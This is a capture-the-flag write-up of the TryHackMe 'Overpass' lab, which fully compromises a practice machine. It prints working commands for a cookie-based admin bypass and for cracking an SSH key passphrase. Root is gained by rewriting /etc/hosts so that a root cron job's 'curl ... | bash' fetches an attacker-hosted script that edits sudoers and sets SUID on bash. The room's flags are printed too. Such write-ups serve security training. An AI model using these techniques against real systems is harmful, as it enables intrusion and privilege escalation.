# Overpass

**Date:** 20, May, 2021

**Author:** Dhilip Sanjay S

---

![Overpass](Images/overpass-port80.png)

## Enumeration

### Nmap

```bash
$ nmap -sC -sV -p- 10.10.123.199 -oN nmap-full
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-19 23:53 IST
Stats: 0:06:24 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 60.23% done; ETC: 00:04 (0:04:13 remaining)
Nmap scan report for 10.10.123.199
Host is up (0.15s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 652.91 seconds
```

### Gobuster

```bash
$ gobuster dir -u http://10.10.123.199 -t 50 -w /usr/share/wordlists/dirb/common.txt -x php,sh,txt,xml,log,js,cgi,py | tee gobuster
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.123.199
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              log,js,cgi,py,php,sh,txt,xml
[+] Timeout:                 10s
===============================================================
2021/05/19 23:55:49 Starting gobuster in directory enumeration mode
===============================================================
/aboutus              (Status: 301) [Size: 0] [--> aboutus/]
/admin                (Status: 301) [Size: 42] [--> /admin/]
/cookie.js            (Status: 200) [Size: 1502]            
/css                  (Status: 301) [Size: 0] [--> css/]    
/downloads            (Status: 301) [Size: 0] [--> downloads/]
/img                  (Status: 301) [Size: 0] [--> img/]      
/index.html           (Status: 301) [Size: 0] [--> ./]        
/login.js             (Status: 200) [Size: 1779]              
/main.js              (Status: 200) [Size: 28]                
                                                              
===============================================================
2021/05/19 23:57:57 Finished
===============================================================
```

## Admin login

- By analysing the javascript files `login.js` and `cookie.js`, we find that a cookie named `SessionToken` being set on a successful login.
- If the cookie value is not being verified in the backend, then we'll be able to access the admin panel.
- So we can manually set the **SessionToken** cookie in the browser or just use `curl`:

```bash
$ curl http://10.10.123.199/admin/ --cookie "SessionToken=something"
<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Overpass</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" media="screen" href="/css/main.css">
    <link rel="icon" 
      type="image/png" 
      href="/img/overpass.png" />
    <script src="/main.js"></script>
</head>

<body>
    <nav>
        <img class="logo" src="/img/overpass.svg" alt="Overpass logo">
        <h2 class="navTitle"><a href="/">Overpass</a></h2>
        <a href="/aboutus">About Us</a>
        <a href="/downloads">Downloads</a>
    </nav>
    <h1 class="pageHeading content">Welcome to the Overpass Administrator area</h1>
    <h3 class="subtitle content">A secure password manager with support for Windows, Linux, MacOS and more</h3>
    <div class="bodyFlexContainer content">
        <div>
            <p>Since you keep forgetting your password, James, I've set up SSH keys for you.</p>
            <p>If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.<br>
                Also, we really need to talk about this "Military Grade" encryption. - Paradox</p>
            <pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----</pre>
        </div>
    </div>
</body>

</html>
```

- We find the **Private Key** of the user **James**.

## Initial Shell

- We'll use `ssh` to get intial shell:

```bash
$ ssh -i id_rsa james@10.10.123.199
The authenticity of host '10.10.123.199 (10.10.123.199)' can't be established.
ECDSA key fingerprint is SHA256:4P0PNh/u8bKjshfc6DBYwWnjk1Txh5laY/WbVPrCUdY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.123.199' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa':
```

- But the ssh key is passphrase protected.
- We'll use `ssh2john`, so that we can bruteforce the passpharse.

```bash
$ python3 /usr/share/john/ssh2john.py
Usage: /usr/share/john/ssh2john.py <RSA/DSA/EC/OpenSSH private key file(s)>

$ python3 /usr/share/john/ssh2john.py id_rsa > forjohn.txt
$ john forjohn.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 1 candidate buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
Proceeding with incremental:ASCII
james13          (id_rsa)
1g 0:00:00:02  3/3 0.3412g/s 597732p/s 597732c/s 597732C/s bhawed
Session aborted
```

- The passpharse is `james13`.
- Now, we'll use `ssh` to login into the machine:

```bash
$ ssh -i id_rsa james@10.10.123.199
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed May 19 19:24:16 UTC 2021

  System load:  0.08               Processes:           88
  Usage of /:   22.3% of 18.57GB   Users logged in:     0
  Memory usage: 13%                IP address for eth0: 10.10.123.199
  Swap usage:   0%


47 packages can be updated.
0 updates are security updates.


Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
james@overpass-prod:~$ whoami
james

james@overpass-prod:~$ id
uid=1001(james) gid=1001(james) groups=1001(james)
```

## user.txt
- **Answer:** thm{65c1aaf000506e56996822c6281e6bf7}

```bash
james@overpass-prod:~$ cat user.txt
thm{65c1aaf000506e56996822c6281e6bf7}

james@overpass-prod:~$ cat todo.txt 
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website

```

![Overpass - user.txt](Images/overpass-user.png)

---

## Privilege Escalation Attempts

### Cracking James' password and checking for sudo permission

- By understanding the `overpass.go` file, we find that the password will be stored in `~/.overpass` file in **ROT47** encoding.
- So, we'll check this file in james directory:

```bash
james@overpass-prod:~$ ls -al
total 48
drwxr-xr-x 6 james james 4096 Jun 27  2020 .
drwxr-xr-x 4 root  root  4096 Jun 27  2020 ..
lrwxrwxrwx 1 james james    9 Jun 27  2020 .bash_history -> /dev/null
-rw-r--r-- 1 james james  220 Jun 27  2020 .bash_logout
-rw-r--r-- 1 james james 3771 Jun 27  2020 .bashrc
drwx------ 2 james james 4096 Jun 27  2020 .cache
drwx------ 3 james james 4096 Jun 27  2020 .gnupg
drwxrwxr-x 3 james james 4096 Jun 27  2020 .local
-rw-r--r-- 1 james james   49 Jun 27  2020 .overpass
-rw-r--r-- 1 james james  807 Jun 27  2020 .profile
drwx------ 2 james james 4096 Jun 27  2020 .ssh
-rw-rw-r-- 1 james james  438 Jun 27  2020 todo.txt
-rw-rw-r-- 1 james james   38 Jun 27  2020 user.txt

james@overpass-prod:~$ cat .overpass 
,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.
```

- By **ROT47** decoding:

```
[{"name":"System","pass":"saydrawnlyingpicture"}]
```

- But unfortunately, james doesn't have any of the sudo permission!
- We find that by using the command `sudo -l` and using the password we obtained recently.

```bash
james@overpass-prod:~$ sudo -l
[sudo] password for james: 
Sorry, user james may not run sudo on overpass-prod.
```

### Checking for SUID

```bash
james@overpass-prod:~$ find / -perm -u=s -type f 2>/dev/null
/bin/fusermount
/bin/umount
/bin/su
/bin/mount
/bin/ping
/usr/bin/chfn
/usr/bin/at
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign

james@overpass-prod:~$ sudo su
[sudo] password for james: 
james is not in the sudoers file.  This incident will be reported.
```

- Even though **sudo** and **su** were having SUID bit set, we couldn't abuse it.

### Checking for other Users

```bash
$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
tryhackme:x:1000:1000:tryhackme:/home/tryhackme:/bin/bash
james:x:1001:1001:,,,:/home/james:/bin/bash
```

- May be we can check the password file of **tryhackme** user.
- But still, permission denied!!

```bash
james@overpass-prod:~$ cd ..

james@overpass-prod:/home$ ls
james  tryhackme

james@overpass-prod:/home$ cd tryhackme/
-bash: cd: tryhackme/: Permission denied
```

### Running Linpeas.sh

- Host a python server to get linpeas on target machine:

```bash
$ python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
10.10.123.199 - - [20/May/2021 01:14:02] "GET /linpeas.sh HTTP/1.1" 200 -
```

- Downlaod and run **linpeas.sh** in the target vulnerable machine.
- I have included only a small part of linpeas output.
- Cron jobs!! 

```bash
james@overpass-prod:~$ wget http://10.17.7.91:8000/linpeas.sh
--2021-05-19 19:46:17--  http://10.17.7.91:8000/linpeas.sh
Connecting to 10.17.7.91:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 325865 (318K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                        100%[=============================================================>] 318.23K   285KB/s    in 1.1s    

2021-05-19 19:46:18 (285 KB/s) - ‘linpeas.sh’ saved [325865/325865]

james@overpass-prod:~$ chmod +x linpeas.sh 
james@overpass-prod:~$ ./linpeas.sh | tee linpeas.out

.
.

[+] Cron jobs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs
/usr/bin/crontab
incrontab Not Found
-rw-r--r-- 1 root root  822 Jun 27  2020 /etc/crontab

/etc/cron.d:
total 20
drwxr-xr-x  2 root root 4096 Feb  3  2020 .
drwxr-xr-x 90 root root 4096 Jun 27  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rw-r--r--  1 root root  589 Jan 14  2020 mdadm
-rw-r--r--  1 root root  191 Feb  3  2020 popularity-contest

/etc/cron.daily:
total 60
drwxr-xr-x  2 root root 4096 Jun 27  2020 .
drwxr-xr-x 90 root root 4096 Jun 27  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root  376 Nov 20  2017 apport
-rwxr-xr-x  1 root root 1478 Apr 20  2018 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1176 Nov  2  2017 dpkg
-rwxr-xr-x  1 root root  372 Aug 21  2017 logrotate
-rwxr-xr-x  1 root root 1065 Apr  7  2018 man-db
-rwxr-xr-x  1 root root  539 Jan 14  2020 mdadm
-rwxr-xr-x  1 root root  538 Mar  1  2018 mlocate
-rwxr-xr-x  1 root root  249 Jan 25  2018 passwd
-rwxr-xr-x  1 root root 3477 Feb 21  2018 popularity-contest
-rwxr-xr-x  1 root root  246 Mar 21  2018 ubuntu-advantage-tools
-rwxr-xr-x  1 root root  214 Nov 12  2018 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Feb  3  2020 .
drwxr-xr-x 90 root root 4096 Jun 27  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Feb  3  2020 .
drwxr-xr-x 90 root root 4096 Jun 27  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Feb  3  2020 .
drwxr-xr-x 90 root root 4096 Jun 27  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root  723 Apr  7  2018 man-db
-rwxr-xr-x  1 root root  211 Nov 12  2018 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash

[+] Services
[i] Search for outdated versions
.
.

[+] Systemd PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
.
.
[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/etc/hosts
/home/james
/run/lock
/run/screen
/run/screen/S-james
/run/user/1001
/run/user/1001/gnupg
/run/user/1001/systemd
/tmp
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.font-unix
#)You_can_write_even_more_files_inside_last_directory
/var/crash
/var/tmp
.
.
```

## Privilege Escalation
### Viewing /etc/crontab

```bash
james@overpass-prod:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

- We must inject code into `buildscript.sh` inorder to escalate our privilege.
- But, the file is being downloaded from **overpass.thm**
- It turns out that **overpass.thm** is `127.0.0.1`. And the server is being hosted by **tryhackme** user, so we can't change the script file.

```bash
james@overpass-prod:~$ ping overpass.thm
PING overpass.thm (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.018 ms
64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.034 ms
64 bytes from localhost (127.0.0.1): icmp_seq=3 ttl=64 time=0.034 ms

--- overpass.thm ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2052ms
rtt min/avg/max/mdev = 0.018/0.028/0.034/0.009 ms
james@overpass-prod:~$ ps -aux | grep server
tryhack+   635  0.1  1.2 1010336 12176 ?       Ssl  18:21   0:07 /home/tryhackme/server -p 80
```

### Modifying /etc/hosts

- If we look at the linpeas output closely, we can find that **/etc/hosts** file is writable.
- So, we can change the IP address and host a different **buildscript.sh** with our malicious code. (Maybe we can add James to the sudoers group, we know his password!)
- Before modifying the IP address, we must replicate the directory structure: `/downloads/src/buildscript.sh` and host a server:

```bash
$ mkdir downloads
$ cd downloads/ && mkdir src
~/downloads$ cd src
~/downloads/src$ echo "usermod -aG sudo james" > buildscript.sh

~/downloads/src$ cat buildscript.sh 
usermod -aG sudo james

~/downloads/src$ cd
$ python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

- Modify the `/etc/hosts` file on the target:

```bash
james@overpass-prod:~$ nano /etc/hosts
james@overpass-prod:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
10.17.7.91 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

### Escalating to root (before adding james to /etc/sudoers)

- We see that our script file is downloaded by the target machine:

```bash
$ python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.123.199 - - [20/May/2021 01:52:02] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
10.10.123.199 - - [20/May/2021 01:53:03] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
```

- Now we'll run `sudo -l` to get permissions of james

```bash
james@overpass-prod:~$ sudo -l
[sudo] password for james: 
Sorry, user james may not run sudo on overpass-prod.

james@overpass-prod:~$ id
uid=1001(james) gid=1001(james) groups=1001(james)

james@overpass-prod:~$ groups james
james : james sudo

james@overpass-prod:~$ sudo su
[sudo] password for james: 
james is not in the sudoers file.  This incident will be reported.

james@overpass-prod:~$ cat /etc/sudoers
cat: /etc/sudoers: Permission denied
```

- Ever though james was added to **sudo group**, the **/etc/sudoers** file didn't contain james.
- So, we need to add that to our script file.
- I also changed the permission of `/bin/bash` to **4777**. (As a backup, incase if modifying sudoers file didn't work)

### Modified buildscript.sh

```bash
$ nano downloads/src/buildscript.sh 

$ cat downloads/src/buildscript.sh 
usermod -aG sudo james
echo "james ALL=(ALL:ALL) ALL" >> /etc/sudoers
chmod 4777 /bin/bash
```

---

## root.txt
- **Answer:** thm{7f336f8c359dbac18d54fdd64ea753bb}

- Finally both worked!!
- Using `sudo bash` and james' password:

```bash
james@overpass-prod:~$ whoami
james
james@overpass-prod:~$ sudo bash

root@overpass-prod:~# ls
downloads  linpeas.out  linpeas.sh  todo.txt  user.txt
root@overpass-prod:~# cd /root
root@overpass-prod:/root# ls
buildStatus  builds  go  root.txt  src
root@overpass-prod:/root# cat root.txt 
thm{7f336f8c359dbac18d54fdd64ea753bb}
```

- Using `/bin/bash -p`:

```bash
root@overpass-prod:~# exit
exit
james@overpass-prod:~$ /bin/bash -p
bash-4.4# whoami
root
bash-4.4# cat /root/root.txt
thm{7f336f8c359dbac18d54fdd64ea753bb}
```

![Overpass - root.txt](Images/overpass-root.txt)

